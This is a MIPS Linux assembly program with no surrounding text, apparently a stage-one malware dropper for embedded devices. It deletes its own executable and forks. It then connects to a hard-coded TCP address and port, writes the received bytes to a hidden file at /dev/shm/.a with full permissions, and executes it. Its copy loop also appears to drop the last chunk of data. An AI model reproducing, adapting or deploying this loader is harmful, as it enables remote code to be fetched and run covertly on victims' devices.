	.text
	.globl __start
#	.set noat
__start:
	li $v0, 4010 # unlink
	lw $a0, 4($sp)
	syscall

	
	li $v0, 4002 # fork
	syscall
	bne $v0, $zero, exit
	
	li   $v0, 4102        # socketcall
	li   $a0, 1           # s= socket (args)
	la   $a1, socket_args
	syscall
	move $t1, $v0         # $t1 = s
	
	li   $v0, 4170        # connect
	move $a0, $t1         # Socket ($t1)
	la   $a1, addr
	li   $a2, 16
	syscall

	li $v0, 4005          # fd = open (fname, FLAGS)
	la $a0, fname
	li $a1, 0x301         # O_CREAT | O_TRUNC | O_WRONLY
	li $a2, 0777
	syscall
	
	move $t2, $v0         # $t2 = fd
	
	# Allocate buffer in stack
	addiu $sp, -1024
	move  $a1, $sp        # $a1 = buffer (second parameters
b0:	
	# read from socket
	li   $v0, 4003        # read 
	move $a0, $t1         # socket
	li   $a2, 1024        # size
	syscall

	move $t3, $v0
	move $a2, $v0
	
	# write to file
	li   $v0, 4004    
	move $a0, $t2         # file
	blt  $t3, 1024, exec
	syscall
	j b0


exec:
	# Close file
	li $v0, 4006
	move $a0, $t2
	syscall
	
	# Exec
	li $v0, 4011
	la $a0, fname 
	move $a1, $zero
	move $a2, $zero
	syscall

exit:	
	# Exit
	li $v0, 4001
	li $a0, 0
	syscall


fname:	.asciz "/dev/shm/.a"
#fname:	.asciz "/tmp/.a"
addr:	.quad 0x000211117f000001
socket_args:	.word 2, 2, 6

